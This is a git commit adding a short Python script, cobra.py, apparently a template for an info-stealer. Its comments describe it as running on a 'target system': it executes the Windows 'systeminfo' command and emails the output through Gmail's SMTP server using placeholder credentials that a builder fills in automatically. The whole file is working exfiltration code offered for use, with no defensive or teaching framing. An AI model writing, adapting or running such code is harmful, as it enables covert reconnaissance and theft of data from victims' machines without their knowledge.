eddc89ccac203fe4c3fe92495daeb082cc69f087
SxNade <73271976+SxNade@users.noreply.github.com>
2020-12-18 00:16:41 -0500

    Add files via upload

---
+++ cobra.py
@@ -0,0 +1,32 @@
+#By SxNade
+#https://github.com/SxNade
+#CONTRIBUTE
+
+import subprocess
+import smtplib
+import getpass
+
+#importing the requred Libraries
+
+email = "this will be edited automatically"
+
+password = "this will be edited automatically"
+
+
+#Function to send email
+def sml(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+#command that will be run on target system to gather info
+command = "systeminfo"
+
+#Storing the target data in a data variable
+
+data = subprocess.check_output(command, shell=True)
+
+sml(email, password, data)
+#calling the sml function to send mail with data as message parameter..
